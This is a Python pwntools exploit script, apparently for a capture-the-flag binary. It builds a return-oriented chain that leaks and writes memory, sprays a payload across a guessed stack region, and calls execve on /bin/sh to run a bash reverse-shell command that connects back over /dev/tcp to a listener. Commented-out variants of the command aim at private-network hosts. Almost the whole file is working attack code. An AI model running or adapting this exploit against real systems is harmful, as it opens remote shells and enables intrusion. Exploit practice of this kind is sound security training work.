# -*- coding: utf-8 -*-

from pwn import *
import time

context.terminal = ["tmux", "splitw", "-h"]

pwnable_filename = "./pro"
pwnable = ELF(pwnable_filename)

# Io = remote("192.168.210.11", 10013)
# Io = remote("172.16.174.128", 4444)
Io = remote("127.0.0.1", 4444)
# Io = process(pwnable_filename)

raw_input(">>>")


output_addr = 0x080480F9
input_addr = 0x080480E1
start_addr = 0x080480B8
base_addr = 0x08048000

stack_start_addr = 0xff900000
stack_start_addr = 0xff8bb000
stack_size = 0x14d000

add_esp_20_ret_addr = 0x0804817C
set_ebcdx_addr = 0x080480FE

stdout = 0x01
stdin = 0x00

junk_size = 0x10
junk = junk_size * "A"

read_id = 0x03
write_id = 0x04
execve_id = 0x0b
mprotect_id = 0x7d

# Step 1. write /bin/sh to memory

call_read_addr = 0x08048138
address_vuln = 0x80480e6

# gdb.attach(proc.pidof(Io)[0], gdbscript='b %s\nb %s\n' % (output_addr, input_addr))

def leak(addr):
    payload = flat([
        junk,
        p32(output_addr),
        p32(start_addr),
        p32(0x1),
        p32(addr),
        p32(0x4),
    ])
    Io.send(payload)
    data = Io.read().split("Good Luck!\n")[1][0:4]
    print "[0x%x] => [%r]" % (addr, data)
    return data

def inject(addr, data):
    payload = flat([
        junk,
        p32(input_addr),
        p32(start_addr),
        p32(0x0),
        p32(addr),
        p32(len(data)),
    ])
    Io.send(payload)
    Io.send(data)
    # print "[0x%x] => [%r]" % (addr, data)


'''
inject(
    stack_start_addr,
    "/bin/sh\x00" + p32(0xFFFFFFFF) + flat([
        p32(output_addr),
        p32(add_esp_20_ret_addr),
        p32(0x1),
        p32(base_addr),
        p32(execve_id),
        p32(0xFFFFFFFF),
        p32(0xFFFFFFFF),
        p32(0xFFFFFFFF),
        p32(0xFFFFFFFF),
        p32(0xFFFFFFFF),
        p32(set_ebcdx_addr),
        p32(start_addr),
        p32(stack_start_addr), # filename -> /bin/sh\x00
        p32(0), # argv p32(0), # env p32(0xFFFFFFFF),
    ]) * (0x10000 * 4)
)

single_payload = flat([
    #########################
    p32(output_addr),
    p32(add_esp_20_ret_addr),
    #p32(0xFFFFFFFF),
    #p32(0xFFFFFFFF),
    "\nid\n",
    "\nid\n",
    #########################
    p32(set_ebcdx_addr),
    p32(start_addr),
    p32(stack_start_addr), # filename -> /bin/sh\x00 x
    p32(0), # argv
    #########################
    p32(0), # env
    #p32(0xFFFFFFFF),
    "\nid\n",
    p32(output_addr),
    p32(add_esp_20_ret_addr),
    #########################
    p32(0x1),
    p32(base_addr),
    p32(execve_id), # x
    #p32(0xFFFFFFFF),
    "\nid\n",
])
'''

reverse_shell_cmd = "bash -c 'bash -i >&/dev/tcp/127.0.0.1/5555 0>&1'"
# reverse_shell_cmd = "bash -c 'bash >&/dev/tcp/192.168.151.26/44 0>&1'"
# reverse_shell_cmd = "bash -c 'bash >&/dev/tcp/172.16.174.1/44 0>&1'"
'''
single_payload = flat([
    #########################
    p32(set_ebcdx_addr),
    p32(start_addr),
    p32(stack_start_addr), # filename -> /bin/sh\x00 x
    p32(stack_start_addr + 0x08 + 0x08 + len(reverse_shell_cmd)), # argv
    #########################
    p32(0), # env
    p32(0xFFFFFFFF),
    p32(output_addr),
    p32(add_esp_20_ret_addr),
    #########################
    p32(0x1),
    p32(base_addr),
    p32(execve_id), # x
    p32(0xFFFFFFFF),
    #########################
    p32(0xFFFFFFFF),
    p32(0xFFFFFFFF),
    p32(0xFFFFFFFF),
    p32(0xFFFFFFFF),
])
'''

single_payload = flat([
    p32(output_addr),
    p32(add_esp_20_ret_addr),
    p32(0x1),
    p32(base_addr),
    p32(execve_id), # x
    p32(0xFFFFFFFF),
    p32(0xFFFFFFFF),
    p32(0xFFFFFFFF),
    p32(0xFFFFFFFF),
    p32(0xFFFFFFFF),
    p32(set_ebcdx_addr),
    p32(0xFFFFFFFF),
    p32(stack_start_addr + 0x10), # filename -> /bin/sh\x00 x
    p32(stack_start_addr), # argv
    p32(0), # env
    p32(0xFFFFFFFF),
])
print "[+] Single payload (0x%x): %r" % (len(single_payload), single_payload)
inject(
    stack_start_addr,
    (
        p32(stack_start_addr + 0x10) +
        p32(stack_start_addr + 0x18) +
        p32(stack_start_addr + 0x20) +
        p32(0) +
        "/bin/sh\x00" +
        "-c\x00\x00\x00\x00\x00\x00" +
        reverse_shell_cmd
    ).ljust(len(single_payload * 2), "\x00") +
    single_payload * (0x40000)
)

Io.interactive()